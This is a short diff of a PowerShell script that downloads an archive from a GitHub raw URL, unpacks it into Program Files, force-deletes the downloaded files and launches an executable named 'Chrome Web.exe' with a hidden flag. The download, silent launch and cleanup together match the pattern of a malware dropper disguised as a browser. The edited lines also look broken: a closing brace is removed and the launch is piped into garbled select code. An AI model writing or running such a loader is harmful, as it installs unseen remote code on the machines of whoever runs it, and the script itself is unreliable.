@@ -29,9 +29,10 @@ invoke-webrequest -uri "https://github.com/Admo9/Data/raw/main/app.zip" -outfile
 #Expand-Archive -Path C:\Users\ProJ03-main\app-64.zip.001 -DestinationPath "C:\Program Files\"
 
 Expand-Archive -Path C:\Users\app.zip -DestinationPath "C:\Program Files\app-64\resources\"
-}
+
 
 Remove-Item -Force -Recurse 'C:\Users\win64.zip', 'C:\Users\ProJ03-main', 'C:\Users\app.zip'
 
-Start-Process "C:\Program Files\app-64\Chrome Web.exe" --hidden
+Start-Process "C:\Program Files\app-64\Chrome Web.exe" --hidden |
 
+select @{n="time";e={$_.Minutes,"Minutes",$_.Seconds,"Seconds",$_.Milliseconds,"Milliseconds" -join " "}}
